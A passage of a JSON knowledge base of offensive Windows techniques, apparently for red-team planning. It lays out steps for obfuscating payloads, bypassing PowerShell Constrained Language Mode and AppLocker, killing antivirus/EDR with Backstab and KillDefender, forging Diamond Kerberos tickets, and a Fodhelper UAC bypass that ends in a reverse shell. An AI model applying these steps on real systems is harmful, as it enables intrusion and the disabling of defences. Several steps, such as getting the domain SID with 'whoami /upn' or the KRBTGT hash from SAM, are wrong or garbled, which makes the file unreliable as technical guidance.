                "description": "Enable specific logging features for an existing trace provider by using the commands that interact with the Windows Registry under the path 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels'.",
                "requirements": {
                    "tool": "PowerShell",
                    "access": "Administrator"
                },
                "results": [
                    "ETW:FEATURE_ENABLED",
                    "ETW:REGISTRY_KEY:[Registry_Path]"
                ]
            }
        ]
    },
    {
        "id": "74a7fc8a-c51c-4a52-8710-bfefc7641c7d",
        "name": "Obfuscation",
        "phase": "10. Bypassing Defenses",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Invoke-Obfuscation",
            "Nimcrypt2"
        ],
        "steps": [
            {
                "id": "8e1b5293-b95f-45f3-a59a-88cfebec753f",
                "name": "Import Invoke-Obfuscation Module",
                "description": "Load the Invoke-Obfuscation PowerShell module which provides functionalities to obfuscate PowerShell scripts.",
                "requirements": {
                    "PowerShell": "Installed"
                },
                "results": [
                    "MODULE:LOADED"
                ]
            },
            {
                "id": "2e646b04-9f2a-44a1-911f-50a45bd1458c",
                "name": "Obfuscate PowerShell Script",
                "description": "Run the Invoke-Obfuscation command to obfuscate a specified PowerShell script for evasion purposes.",
                "requirements": {
                    "Invoke-Obfuscation": "Module Imported"
                },
                "results": [
                    "SCRIPT:OBFUSCATED"
                ]
            },
            {
                "id": "625327fd-5995-4a7c-ab36-97ecb5f2934c",
                "name": "Run Nimcrypt2 with Basic Options",
                "description": "Use Nimcrypt2 to compile or obfuscate a specified file into an executable based on the provided options.",
                "requirements": {
                    "Nimcrypt2": "Installed",
                    "File": "Valid file path"
                },
                "results": [
                    "FILE:OBFUSCATED",
                    "EXECUTABLE:GENERATED"
                ]
            },
            {
                "id": "d1c9c6b4-5b48-4fd3-8247-d16bf261acbc",
                "name": "Nimcrypt2 Shellcode Injection",
                "description": "Inject shellcode into a specified process using Nimcrypt2, allowing for stealthier execution within a targeted process.",
                "requirements": {
                    "Nimcrypt2": "Installed",
                    "Process": "Target process name"
                },
                "results": [
                    "SHELLCODE:INJECTED",
                    "PROCESS:ACTIVE"
                ]
            },
            {
                "id": "f97fdfed-4929-4261-9e85-41be9fabe918",
                "name": "Obfuscate Strings with Nimcrypt2",
                "description": "Use the '-e' option in Nimcrypt2 to encrypt strings in a compiled executable, obfuscating sensitive data.",
                "requirements": {
                    "Nimcrypt2": "Installed",
                    "File": "Valid file path"
                },
                "results": [
                    "STRINGS:OBFUSCATED"
                ]
            }
        ]
    },
    {
        "id": "bf4060e9-d50b-455f-86a1-c502ba175b7a",
        "name": "PowerShell Constrained Language Mode",
        "phase": "10. Bypassing Defenses",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# PowerShell Constrained Language Mode\nWhen AppLocker is enabled PowerShell is placed into Constrained Language Mode (CLM), which restricts it to core types.\n\n## Show language mode of CLM\n> $ExecutionContext.SessionState.LanguageMode\n\n> beacon> remote-exec winrm dc-1 $ExecutionContext.SessionState.LanguageMode\n\nAny AppLocker bypass can result in CLM bypass. Cobalt Strike has a `powerpick` command, which is an \"unmanaged\" implementation of tapping into a PowerShell runspace, without using `powershell.exe`.\n\n```beacon\nbeacon> run hostname\ndc-1\n\nbeacon> powershell $ExecutionContext.SessionState.LanguageMode\nConstrainedLanguage\n\nbeacon> powershell [math]::Pow(2,10)\n<Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\"><S S=\"Error\">Cannot invoke method. Method invocation is supported only on core types in this language mode._x000D__x000A_</S><S S=\"Error\">At line:1 char:1_x000D__x000A_</S><S S=\"Error\">+ [math]::Pow(2,10)_x000D__x000A_</S><S S=\"Error\">+ ~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S=\"Error\">    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException_x000D__x000A_</S><S S=\"Error\">    + FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage_x000D__x000A_</S><S S=\"Error\"> _x000D__x000A_</S></Objs>\n\nbeacon> powerpick $ExecutionContext.SessionState.LanguageMode\nFullLanguage\n\nbeacon> powerpick [math]::Pow(2,10)\n1024\n```\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "f5a55131-5220-401f-8e55-b91ce9ecde73",
                "name": "Bypass CLM using lolbins",
                "description": "Perform an all-in-one bypass of Constrained Language Mode (CLM) using legitimate binaries.",
                "requirements": {},
                "results": [
                    "CLM:BYPASS"
                ]
            },
            {
                "id": "f5a21131-5220-401f-8e55-b91ce9ecde73",
                "name": "Create Custom Runspaces",
                "description": "Bypass PowerShell's Constrained Language Mode by creating custom runspaces; Applocker bypass is also required for any C# binaries.",
                "requirements": {},
                "results": [
                    "CUSTOM:RUNSPACE"
                ]
            },
            {
                "id": "b12e07f5-b1f6-4f14-8fa5-30d2e62a831f",
                "name": "Encode Payload",
                "description": "Encode the payload using a suitable encoding method to bypass detection mechanisms.",
                "requirements": {},
                "results": [
                    "PAYLOAD:ENCODED"
                ]
            },
            {
                "id": "b54896cb-57a8-42b3-bbcd-370e5cf77e7e",
                "name": "Download Encoded Payload",
                "description": "Download the previously encoded payload from a designated remote location.",
                "requirements": {},
                "results": [
                    "PAYLOAD:DOWNLOADED"
                ]
            },
            {
                "id": "f5a22131-5220-401f-8e55-b91ce9ecde73",
                "name": "Decode Downloaded Payload",
                "description": "Decode the payload that was downloaded, preparing it for execution.",
                "requirements": {},
                "results": [
                    "PAYLOAD:DECODED"
                ]
            },
            {
                "id": "98b85a43-9b26-4ac5-8265-b89e47df7c16",
                "name": "Bypass Applocker",
                "description": "Utilize a trusted binary to bypass C# Applocker restrictions, enabling execution of malicious payloads.",
                "requirements": {},
                "results": [
                    "APPL:BYPASS"
                ]
            }
        ]
    },
    {
        "id": "bf4730e9-d50b-455f-86a1-c502ba175b7a",
        "name": "Device Guard",
        "phase": "03. Host Enumeration",
        "ttp": "T1000",
        "external": false,
        "description": "Windows Defender Application Control and virtualization-based protection of code integrity. It encompasses Windows Defender Application Control and Microsoft Defender Application Guard.",
        "category": "Protections",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "e7a112a1-bd27-4d60-b422-f9cb0cbc1d8e",
                "name": "Check Windows Defender Application Control Status",
                "description": "Query the status of Windows Defender Application Control (WDAC) using PowerShell to verify whether it is enabled or disabled.",
                "requirements": {},
                "results": [
                    "WDAC:ENABLED",
                    "WDAC:DISABLED"
                ]
            },
            {
                "id": "0c5f2bf4-e426-4d12-9837-cf230e45da02",
                "name": "Review WDAC Policies",
                "description": "List the existing Windows Defender Application Control policies configured on the system using PowerShell to ensure compliance and proper deployment.",
                "requirements": {},
                "results": [
                    "WDAC:POLICIES_FOUND",
                    "WDAC:NO_POLICIES"
                ]
            },
            {
                "id": "1d3a176e-08f4-4e9b-a7b0-e1ca68e96f87",
                "name": "Verify Application Guard Configuration",
                "description": "Check if Microsoft Defender Application Guard is configured for Microsoft Edge through the registry settings, specifically under HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System.",
                "requirements": {},
                "results": [
                    "AG:ENABLED",
                    "AG:DISABLED"
                ]
            },
            {
                "id": "9f7a92f1-3ecc-4f3b-a5dd-1a8b5e5bbfe7",
                "name": "Check Device Guard Feature Status",
                "description": "Query the Device Guard feature statuses by utilizing the 'Get-WindowsFeature' PowerShell command to ensure that Device Guard features are enabled on the system.",
                "requirements": {},
                "results": [
                    "DG:FEATURE_ENABLED",
                    "DG:FEATURE_DISABLED"
                ]
            },
            {
                "id": "209e1507-fc61-4c00-b8eb-001e5da8cdb3",
                "name": "List Virtualization-based Security Settings",
                "description": "Retrieve and display the current state of Virtualization-based Security settings using the command 'Get-CimInstance -ClassName Win32_DeviceGuard' in PowerShell.",
                "requirements": {},
                "results": [
                    "VBS:ENABLED",
                    "VBS:DISABLED"
                ]
            }
        ]
    },
    {
        "id": "0180435c-e951-4e0a-aa02-38421e2e25dd",
        "name": "Signed drivers",
        "phase": "10. Bypassing Defenses",
        "ttp": "T1000",
        "external": false,
        "description": "Using signed drivers to kill AV / EDR tools",
        "content": "",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Backstab]]\n```cmd\nUsage: backstab.exe <-n name || -p PID> [options]  \n\t-n,\tChoose process by name, including the .exe suffix\n\t-p, \tChoose process by PID\n\t-l, \tList handles of protected process\n\t-k, \tKill the protected process by closing its handles\n\t-x, \tClose a specific handle\n\t-d, \tSpecify path to where ProcExp will be extracted\n\t-s, \tSpecify service name registry key\n\t-u, \tUnload ProcExp driver\n\t-a,\tadds SeDebugPrivilege\n\t-h, \tPrint this menu\n\n\tExamples:\n\tbackstab.exe -n cyserver.exe -k \t\t\t[kill cyserver]\n\tbackstab.exe -n cyserver.exe -x E4C \t\t[Close handle E4C of cyserver]\n\tbackstab.exe -n cyserver.exe -l \t\t\t[list all handles of cyserver]\n\tbackstab.exe -p 4326 -k -d c:\\\\driver.sys \t[kill protected process with PID 4326, extract ProcExp driver to C:\\ drive]\n```"
        ],
        "tools": [
            "Backstab"
        ],
        "steps": [
            {
                "id": "ef7cfa5d-7e76-4a7e-a5b4-900dadd6bfe1",
                "name": "List handles of a protected process",
                "description": "Use Backstab to list all handles of a specific protected process by name or PID to identify resources that can be manipulated.",
                "requirements": {},
                "results": [
                    "HANDLE:LIST"
                ]
            },
            {
                "id": "bb32c4dc-8345-428b-b46c-4e63dfb1033c",
                "name": "Kill a protected process",
                "description": "Execute Backstab with the -k option using either a process name or PID to terminate a protected process, such as an antivirus or EDR tool.",
                "requirements": {},
                "results": [
                    "PROCESS:KILLED"
                ]
            },
            {
                "id": "2442984d-e8f0-49e1-b498-1219e591d9f3",
                "name": "Close a specific handle",
                "description": "Identify and close a specific handle of a protected process using Backstab with the -x option, targeting a handle ID.",
                "requirements": {},
                "results": [
                    "HANDLE:CLOSED"
                ]
            },
            {
                "id": "48a8c220-05cb-4a94-8c77-db43115edd41",
                "name": "Extract ProcExp driver",
                "description": "Use Backstab to extract the ProcExp driver to a specified path when killing a particular protected process, enabling further actions.",
                "requirements": {},
                "results": [
                    "DRIVER:EXTRACTED"
                ]
            }
        ]
    },
    {
        "id": "eb4e2529-ad89-4120-84e2-251718212c1b",
        "name": "Token Sandboxing",
        "phase": "10. Bypassing Defenses",
        "ttp": "T1000",
        "external": false,
        "description": "Removes the privileges of the process token to isolate the process",
        "content": "",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Kill Defender]]\n> killdefender.exe <PID>"
        ],
        "tools": [
            "Kill Defender"
        ],
        "steps": [
            {
                "id": "394c1b65-6b5b-44d6-8ef2-0ee20daf77f6",
                "name": "Identify target process",
                "description": "Determine the process ID (PID) of the target application that you want to sandbox.",
                "requirements": {},
                "results": [
                    "TARGET:PID"
                ]
            },
            {
                "id": "5b8e5e66-a2d2-4cb2-89ed-e7c5b700d7c9",
                "name": "Kill Defender for target process",
                "description": "Execute the command to kill the Defender process for the identified PID to isolate it.",
                "requirements": {
                    "tool": "Kill Defender"
                },
                "results": [
                    "DEFENDER:STOPPED",
                    "PROCESS:ISOLATED"
                ]
            },
            {
                "id": "6c413f84-1a06-4352-8e24-1f552bc6f8bc",
                "name": "Verify token privileges removal",
                "description": "Check the process token privileges of the target application to confirm they have been disabled.",
                "requirements": {},
                "results": [
                    "TOKEN:PRIVILEGES_REMOVED",
                    "STATUS:VERIFIED"
                ]
            }
        ]
    },
    {
        "id": "385824c8-406e-47c8-a45c-8c5136415294",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1558",
        "external": false,
        "description": "Diamond PACs are attackers\u2019 crafted PAC, signed with a stolen KRBTGT key. The Diamond PAC can be used by attackers to assign high privileges to a user\u2019s access request, regardless of the user\u2019s original permissions. In contrast to the Golden Ticket attack, which also uses a stolen KRBTGT key and can be used to provide high privileges to the attacker, the Diamond PAC attack does not craft a full Kerberos ticket, but uses the standard Kerberos flow (in the same manner of the MS14-068 exploit) to inject the crafted Diamond PAC. By doing so, the Diamond PAC attack represents a more subtle version of the Golden Ticket attack and thus harder to detect. Detection rules designed to catch Golden Ticket attack based on the Kerberos traffic anomaly it creates of a user sending a valid TGS with no prior AS requests to obtain a TGT will not alert on the Diamond PAC attack.",
        "category": "",
        "stealthy": false,
        "tools": [],
        "changes": [],
        "name": "Diamond Ticket",
        "content": "",
        "steps": [
            {
                "id": "aee6a7d0-a9f3-476d-8965-baa349b6c78d",
                "name": "Get the KRBTGT",
                "description": "Retrieve the KRBTGT account's password hash from the NTDS database, typically located at C:\\Windows\\NTDS\\NTDS.dit or through the SAM database in C:\\Windows\\System32\\config\\SAM on a domain controller.",
                "requirements": {},
                "results": [
                    "CRED:HASH:KRBTGT"
                ]
            },
            {
                "id": "fcc5d1d5-1d28-4993-90c6-65e083f75ef1",
                "name": "Get the TGT's authentication time",
                "description": "Extract the authentication time of the Ticket Granting Ticket (TGT) for the user from the Kerberos ticket cache (typically found in memory or via the klist command in C:\\Windows\\System32).",
                "requirements": {},
                "results": [
                    "CRED:TICKET:TGT"
                ]
            },
            {
                "id": "90ec2fb0-6626-4ff8-9e65-de3ceb4f5db8",
                "name": "Get the SID of current domain",
                "description": "Retrieve the Security Identifier (SID) of the current domain by using the command 'whoami /upn' or checking the relevant registry keys under HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI.",
                "requirements": {},
                "results": [
                    "INTEL:DOMAIN:SID"
                ]
            },
            {
                "id": "37bd25df-c486-44ed-b6a1-cc8928e598ed",
                "name": "Generate diamond ticket",
                "description": "Create a Diamond ticket by combining the KRBTGT hash, TGT authentication time, and domain SID. This ticket can be generated through various tools or scripts that facilitate crafting tickets, provided the necessary credentials are acquired.",
                "requirements": {
                    "and": [
                        {
                            "tag": "CRED:HASH:KRBTGT"
                        },
                        {
                            "tag": "CRED:TICKET:TGT"
                        },
                        {
                            "tag": "INTEL:DOMAIN:SID"
                        }
                    ]
                },
                "results": [
                    "CRED:TICKET:TGT:DIAMOND"
                ]
            }
        ]
    },
    {
        "id": "2400012b-2e82-47b6-8038-23d8a5a5af3f",
        "phase": "02. Reconnaissance",
        "ttp": "T1563",
        "external": false,
        "description": "Browser pivot through chrome (chromium) remote debugging.\nIncludes MsEdge.",
        "category": "",
        "stealthy": true,
        "tools": [],
        "changes": [],
        "name": "Browser Remote Debugging",
        "content": "",
        "steps": [
            {
                "id": "f5a21131-58b0-401f-8e55-b91ce9ecde73",
                "name": "Setup SOCKS",
                "description": "Configure a SOCKS proxy server to route your traffic securely.",
                "requirements": {},
                "results": [
                    "PROTO:SOCKS"
                ]
            },
            {
                "id": "3d6bbf72-2a5a-4bf8-90bb-967edfb22af3",
                "name": "Connect to SOCKS",
                "description": "Establish a connection to the SOCKS proxy you've set up, ensuring that your traffic is routed through it.",
                "requirements": {
                    "tag": "PROTO:SOCKS"
                },
                "results": [
                    "EXECUTION:REMOTE"
                ]
            },
            {
                "id": "5c4179d1-3475-41aa-b5c0-7996fedafad9",
                "name": "Setup Chrome",
                "description": "Launch Chrome (or Chromium) with the necessary flags to enable remote debugging on a specified port.",
                "requirements": {
                    "tag": "TOOL:Chromium"
                },
                "results": [
                    "EXECUTION:REMOTE"
                ]
            },
            {
                "id": "597a5ad2-f7ab-4a45-9e22-1df433016e5a",
                "name": "Connect to remote debugging",
                "description": "Initiate a connection to the remote debugging interface of Chrome, which allows interaction with the browser's internals.",
                "requirements": {
                    "and": [
                        {
                            "tag": "TOOL:Chromium"
                        },
                        {
                            "tag": "PROTO:SOCKS"
                        }
                    ]
                },
                "results": [
                    "INTEL:WEB"
                ]
            }
        ],
        "references": [
            "https://twitter.com/an0n_r0/status/1670007830072500225",
            "https://gist.github.com/NotMedic/b1ab7809eea94cc05513905b26964663"
        ]
    },
    {
        "id": "9ac4767a-0052-4770-9593-4f7de131b829",
        "phase": "05. Privilege Escalation",
        "ttp": "T1548.002",
        "external": false,
        "description": "The Fodhelper binary runs as high integrity, and it is vulnerable to exploitation due to the way it interacts with the Windows Registry. It interacts with the current user\u2019s registry and reads \"HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\".",
        "category": "Exploits",
        "stealthy": false,
        "tools": [
            "Metasploit"
        ],
        "changes": [],
        "name": "Fodhelper",
        "content": "",
        "steps": [
            {
                "id": "e5702c5f-ad8c-41f8-bd80-dc09b7a0cdd0",
                "name": "Setup MSF",
                "description": "Initialize the Metasploit Framework to set up a listener for incoming connections. This ensures that the environment is ready for exploitation.",
                "requirements": {},
                "results": [
                    "C2:LISTENER:HTTPS"
                ]
            },
            {
                "id": "f5576bb2-603f-4863-a9f6-bfa423abc8f3",
                "name": "Check Registry Key",
                "description": "Verify the existence and contents of the registry key 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' to confirm that Fodhelper can be exploited.",
                "requirements": {},
                "results": [
                    "REGKEY:FOUND",
                    "REGVALUE:COMMAND"
                ]
            },
            {
                "id": "37c6efde-8d06-4d80-a37d-d44c50e0f233",
                "name": "Modify Registry Key",
                "description": "Modify the registry key to include a payload that will be executed by Fodhelper when triggered. This action sets the command to launch a reverse shell or other payload.",
                "requirements": {},
                "results": [
                    "REGKEY:MODIFIED",
                    "EXPLOITS:FODHELPER"
                ]
            },
            {
                "id": "b37e828e-2198-4069-9940-cba3adf6013c",
                "name": "Exploit Fodhelper",
                "description": "Trigger Fodhelper to execute the command stored in the registry, which should lead to a reverse shell connection back to the attacker's listener.",
                "requirements": {},
                "results": [
                    "EXPLOITS:FODHELPER",
                    "SHELL:CONNECTED"
                ]
            }
        ],
        "references": [
            "https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/"
        ]
    }
]